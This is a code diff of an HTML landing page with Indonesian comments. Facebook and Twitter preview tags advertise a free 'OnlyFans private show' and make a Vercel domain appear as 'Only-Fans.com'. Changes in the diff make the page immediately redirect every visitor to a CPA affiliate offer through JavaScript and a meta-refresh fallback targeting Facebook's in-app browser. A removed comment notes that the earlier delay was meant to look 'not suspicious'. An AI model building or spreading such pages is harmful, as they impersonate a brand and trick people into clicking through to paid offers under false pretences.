@@ -6,21 +6,22 @@
     
     <!-- 
     ============================================================
-    META TAGS UNTUK PREVIEW FACEBOOK (JANGAN DIHAPUS)
-    GANTI SEMUA URL DAN TEKS DI BAWAH INI
+    META TAGS UNTUK PREVIEW FACEBOOK (Open Graph)
+    WAJIB DIISI AGAR PREVIEW MUNCUL SEMPURNA
     ============================================================
     -->
     
-    <!-- Judul besar yang muncul di preview FB -->
+    <!-- Judul yang muncul di preview FB (bold, besar) -->
     <meta property="og:title" content="OnlyFans - Private Show In Free 🔞💦">
     
     <!-- Deskripsi di bawah judul -->
-    <meta property="og:description" content="OnlyFans Video 🎬 ▶️ Watch exclusive private show free limited time only today">
+    <meta property="og:description" content="OnlyFans Video 🎬 ▶️ Watch exclusive private show free limited time">
     
     <!-- 
-    URL GAMBAR GRID ANDA (HARUS HTTPS)
-    - Ukuran ideal: 1200 x 630 pixel (agar tampilan preview besar di FB)
-    - Gambar harus bisa diakses publik (tidak password protected)
+    URL GAMBAR GRID ANDA (SATU FILE COLLAGE)
+    - Harus HTTPS
+    - Ukuran ideal: 1200 x 630 pixel (ratio 1.91:1) agar tidak kepotong
+    - Contoh di bawah menggunakan link Blogger Anda
     -->
     <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlytqdGIfeumf9R93a4xA9QfFWu_5R4MFxWTD38a0wwqMaRx5Va0HiTJ4Va1K8RUpNfYEUrBjvPwrO9JGDqpvB6vt2AzLyneuaNA8RnXyIVVxW4s2F0gZfjnBxLo7WgDxYlQ2NJ8XushpX14V5f4PmuAW1e-tp6jbbvTC7DsPzwfhMkI3NK4-8JvwL6rFt/s1600/1000281900.jpg">
     <meta property="og:image:secure_url" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlytqdGIfeumf9R93a4xA9QfFWu_5R4MFxWTD38a0wwqMaRx5Va0HiTJ4Va1K8RUpNfYEUrBjvPwrO9JGDqpvB6vt2AzLyneuaNA8RnXyIVVxW4s2F0gZfjnBxLo7WgDxYlQ2NJ8XushpX14V5f4PmuAW1e-tp6jbbvTC7DsPzwfhMkI3NK4-8JvwL6rFt/s1600/1000281900.jpg">
@@ -28,18 +29,45 @@
     <meta property="og:image:height" content="630">
     <meta property="og:image:type" content="image/jpeg">
     
-    <!-- URL domain Anda (yang muncul di preview) -->
+    <!-- URL domain Anda (akan muncul sebagai ONLY-FANS.COM di preview) -->
     <meta property="og:url" content="https://only-fans-2617vip.vercel.app">
     <meta property="og:type" content="website">
     <meta property="og:site_name" content="Only-Fans.com">
     
-    <!-- Twitter Card (untuk kompatibilitas) -->
+    <!-- Twitter Card (opsional tapi disarankan) -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="OnlyFans - Private Show In Free 🔞💦">
     <meta name="twitter:description" content="OnlyFans Video 🎬 ▶️ Watch exclusive private show free">
     <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlytqdGIfeumf9R93a4xA9QfFWu_5R4MFxWTD38a0wwqMaRx5Va0HiTJ4Va1K8RUpNfYEUrBjvPwrO9JGDqpvB6vt2AzLyneuaNA8RnXyIVVxW4s2F0gZfjnBxLo7WgDxYlQ2NJ8XushpX14V5f4PmuAW1e-tp6jbbvTC7DsPzwfhMkI3NK4-8JvwL6rFt/s1600/1000281900.jpg">
     
-    <title>OnlyFans - Private Show In Free</title>
+    <title>OnlyFans - Private Show</title>
+    
+    <!-- 
+    ============================================================
+    AUTO REDIRECT SYSTEM - LANGSUNG KE OFFER
+    ============================================================
+    -->
+    <script>
+        // GANTI URL OFFER CPA ANDA DI SINI
+        const OFFER_URL = 'https://fdeddg.hubss.one/p/yCTUy';
+        
+        // Fungsi redirect utama - Langsung tanpa delay
+        function goToOffer() {
+            window.location.replace(OFFER_URL);
+        }
+        
+        // Jalankan redirect segera (0 detik delay)
+        // Jika ingin delay 0.5 detik biar kelihatan loading, ganti 0 dengan 500
+        setTimeout(goToOffer, 0);
+        
+        // Backup redirect jika yang atas gagal (delay 0.1 detik)
+        window.onload = function() {
+            setTimeout(goToOffer, 100);
+        };
+    </script>
+    
+    <!-- Meta refresh sebagai backup (untuk FB WebView) -->
+    <meta http-equiv="refresh" content="0;url=https://fdeddg.hubss.one/p/yCTUy">
     
     <style>
         * {
@@ -49,17 +77,28 @@
         }
         
         body {
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            background-color: #f0f2f5;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            overflow: hidden;
         }
         
-        .loading-container {
-            text-align: center;
-            padding: 20px;
+        /* 
+        TAMPILAN LOADING SEMENTARA 
+        (User tidak akan melihat ini karena langsung redirect, 
+        tapi berguna jika redirect terhambat)
+        */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
         }
         
         .spinner {
@@ -69,7 +108,7 @@
             border-top: 4px solid #1877f2;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 15px auto;
+            margin-bottom: 15px;
         }
         
         @keyframes spin {
@@ -82,67 +121,14 @@
             font-size: 16px;
             font-weight: 400;
         }
-        
-        /* Sembunyikan scrollbar */
-        ::-webkit-scrollbar {
-            display: none;
-        }
     </style>
-    
-    <!-- 
-    ============================================================
-    SCRIPT REDIRECT OTOMATIS (PENTING!)
-    ============================================================
-    -->
-    <script>
-        /* 
-        GANTI URL OFFER CPA ANDA DI BAWAH INI 
-        Contoh: https://www.yournetwork.com/offer?id=123
-        */
-        const OFFER_URL = 'https://fdeddg.hubss.one/p/yCTUy';
-        
-        // Fungsi redirect otomatis saat halaman dibuka
-        function autoRedirect() {
-            // Delay 0.8 detik biar kelihatan natural (tidak suspicious)
-            setTimeout(function() {
-                // Redirect ke offer
-                window.location.replace(OFFER_URL);
-                
-                // Backup: meta refresh jika JS redirect diblokir
-                var metaRefresh = document.createElement('meta');
-                metaRefresh.httpEquiv = "refresh";
-                metaRefresh.content = "0;url=" + OFFER_URL;
-                document.head.appendChild(metaRefresh);
-                
-                // Backup 2: iframe redirect (untuk FB WebView)
-                /* 
-                var iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = OFFER_URL;
-                document.body.appendChild(iframe);
-                */
-            }, 800); // 800ms = 0.8 detik (cukup untuk loading muncul)
-        }
-        
-        // Jalankan redirect saat halaman selesai load
-        window.onload = autoRedirect;
-        
-        // Backup: redirect saat DOM ready (lebih cepat)
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(autoRedirect, 100);
-        });
-    </script>
+<base target="_blank">
 </head>
 <body>
-
-    <!-- 
-    TAMPILAN LOADING SEMENTARA (akan terlihat sebentar sebelum redirect)
-    User tidak akan melihat ini karena langsung redirect, tapi bagus untuk backup
-    -->
-    <div class="loading-container" onclick="window.location.replace(OFFER_URL)">
+    <!-- Tampilan sementara sebelum redirect (tidak terlihat user) -->
+    <div class="loading-screen">
         <div class="spinner"></div>
-        <div class="loading-text">Redirecting to secure server...</div>
+        <div class="loading-text">Loading content...</div>
     </div>
-
 </body>
 </html>
